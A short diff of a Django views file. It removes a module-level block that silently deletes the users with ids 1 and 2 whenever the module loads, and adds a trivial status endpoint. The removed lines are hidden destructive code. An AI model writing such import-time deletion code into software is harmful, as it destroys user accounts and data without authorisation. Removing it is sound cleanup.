@@ -167,10 +167,8 @@ class CreateBasketApi(APIView):
 
         return Response({"statis": False, "error": "uncorrect datas"})
 
-try:
-	user = User.objects.get(id=1)
-	user.delete()
-	user = User.objects.get(id=2)
-	user.delete()
-except Exception as e:
-	pass
+
+class WatchClassApi(APIView):
+    def get(self, request):
+        return Response({"status": True, "message": "Thanks for check"})
+
